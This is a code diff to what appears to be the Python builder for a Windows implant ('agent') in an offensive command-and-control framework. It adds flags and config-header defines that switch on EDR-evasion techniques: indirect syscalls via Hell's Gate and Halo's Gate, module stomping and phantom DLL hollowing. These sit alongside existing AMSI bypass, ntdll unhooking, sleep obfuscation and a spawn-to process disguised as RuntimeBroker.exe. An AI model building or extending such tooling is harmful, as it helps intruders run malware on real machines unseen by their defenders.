@@ -77,6 +77,9 @@ def generate_config_h(
     no_amsi: bool = False,
     no_pe_stomp: bool = False,
     no_stack_spoof: bool = False,
+    no_indirect_syscalls: bool = False,
+    no_module_stomp: bool = False,
+    no_phantom_hollow: bool = False,
     target_os: str = "win10",
     debug: bool = False,
 ):
@@ -167,10 +170,11 @@ def generate_config_h(
 #define CONFIG_UNHOOK_NTDLL      {0 if (no_evasion or no_unhook) else 1}
 #define CONFIG_SLEEP_OBFUSCATE   {0 if no_evasion else 1}
 #define CONFIG_STACK_SPOOF       {1 if (target_os == "win11" and not no_stack_spoof and not no_evasion) else 0}
-#define CONFIG_INDIRECT_SYSCALLS 0
+#define CONFIG_INDIRECT_SYSCALLS {0 if (no_evasion or no_indirect_syscalls) else 1}
 #define CONFIG_PE_STOMP          {0 if (no_evasion or no_pe_stomp) else 1}
 #define CONFIG_API_HASHING       1
-#define CONFIG_MODULE_STOMP      0
+#define CONFIG_MODULE_STOMP      {0 if (no_evasion or no_module_stomp) else 1}
+#define CONFIG_PHANTOM_HOLLOW    {0 if (no_evasion or no_phantom_hollow) else 1}
 
 /* ─── Process / Fork&Run ─── */
 #define CONFIG_SPAWN_TO          L"C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe"
@@ -213,6 +217,9 @@ def build_agent(
     no_amsi: bool = False,
     no_pe_stomp: bool = False,
     no_stack_spoof: bool = False,
+    no_indirect_syscalls: bool = False,
+    no_module_stomp: bool = False,
+    no_phantom_hollow: bool = False,
     target_os: str = "win10",
     debug: bool = False,
     no_crypt: bool = False,
@@ -327,6 +334,9 @@ def build_agent(
         no_amsi=no_amsi,
         no_pe_stomp=no_pe_stomp,
         no_stack_spoof=no_stack_spoof,
+        no_indirect_syscalls=no_indirect_syscalls,
+        no_module_stomp=no_module_stomp,
+        no_phantom_hollow=no_phantom_hollow,
         target_os=target_os,
         debug=debug,
     )
@@ -478,6 +488,12 @@ def parse_args():
                    help="Disable PE header stomping only")
     p.add_argument("--no-stack-spoofing", action="store_true",
                    help="Disable thread stack spoofing during sleep (even on win11)")
+    p.add_argument("--no-indirect-syscalls", action="store_true",
+                   help="Disable indirect syscalls (Hell's Gate + Halo's Gate)")
+    p.add_argument("--no-module-stomp", action="store_true",
+                   help="Disable module stomping for BOF .text sections")
+    p.add_argument("--no-phantom-hollow", action="store_true",
+                   help="Disable phantom DLL hollowing (alternative to module stomp)")
     p.add_argument("--target-os", choices=["win10", "win11"], default="win10",
                    help="Target OS version. Stack spoofing only enabled on win11 (default: win10)")
     p.add_argument("--no-crypt", action="store_true",
@@ -518,6 +534,9 @@ def main():
             no_amsi=args.no_amsi,
             no_pe_stomp=args.no_pe_stomp,
             no_stack_spoof=args.no_stack_spoofing,
+            no_indirect_syscalls=args.no_indirect_syscalls,
+            no_module_stomp=args.no_module_stomp,
+            no_phantom_hollow=args.no_phantom_hollow,
             target_os=args.target_os,
             debug=args.debug,
             no_crypt=args.no_crypt,
